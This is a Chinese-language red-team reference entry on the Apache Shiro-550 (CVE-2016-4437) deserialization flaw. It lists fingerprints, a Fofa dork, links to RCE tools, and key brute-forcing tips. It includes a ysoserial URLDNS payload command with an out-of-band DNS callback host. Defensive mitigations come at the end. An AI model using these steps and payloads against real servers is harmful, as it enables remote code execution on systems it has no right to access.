# Web 漏洞分析案例
来源：[2020攻防演练弹药库](https://blog.riskivy.com/2020%e6%94%bb%e9%98%b2%e6%bc%94%e7%bb%83%e5%bc%b9%e8%8d%af%e5%ba%93-%e6%82%a8%e6%9c%89%e4%b8%bb%e6%9c%ba%e4%b8%8a%e7%ba%bf%e8%af%b7%e6%b3%a8%e6%84%8f/)


## CVE-2016-4437

Apache Shiro RememberMe 反序列化导致的命令执行漏洞，也称Shiro-550。

### 漏洞简介

Apache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用。Apache Shiro 在 Java 的权限及安全验证框架中占用重要的一席之地，在它编号为550的 issue 中爆出严重的 Java 反序列化漏洞。

### 影响组件

Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)

### 漏洞指纹

- ```set-Cookie: rememberMe=deleteMe```
- 或者URL中有shiro字样
- 有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可

### Fofa Dork
- app="Apache-Shiro"

### 漏洞分析

【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞
https://paper.seebug.org/shiro-rememberme-1-2-4/

### 漏洞利用

wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具
https://github.com/wyzxxz/shiro_rce

Apache Shiro回显poc改造计划
https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw

### 利用技巧

1.使用多个泄露的key进行遍历, 这个在实战中确实有效

关于Shiro反序列化漏洞的延伸—升级shiro也能被shell https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw

Shiro 100 Key https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA

2.使用 URLDNS 进行检测提速

使用适应性最强的URLDNS(这个不受JDK版本和安全策略影响, 除非网络限制不能出DNS)进行检测

且可以使用ysoserial提前生成序列化内容

java -jar target/ysoserial-0.0.5-SNAPSHOT-all.jar URLDNS "http://1234567890.test.ceye.io" > urldns.ser

然后使用占位符+目标url hash的方法修改序列化内容中的urldns地址

提高检测速度以及后续检测无需使用ysoserial

例如 1234567890.test.ceye.io 可以换成 md5('www.qq.com').hexdigest() [:10].test.ceye.io

也就是 9d2c68d82d.test.ceye.io

可以预先记录 hash

9d2c68d82d www.qq.com

然后进行hash查表就可以知道是DNSLOG来自哪个目标, 性能会提高不少

3.已知目标使用了Shiro, 可以采取Shiro-721的报错逻辑来进行遍历key — 星光哥

这样即使DNS不能出网, 也可以通过是否返回 rememberMe=deleteMe 来断定 shiro key 的正确性, 前提是服务器有rememberMe=deleteMe相关回显

8. 防护方法

1.升级Shiro到最新版

2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上

3.WAF拦截Cookie中长度过大的rememberMe值

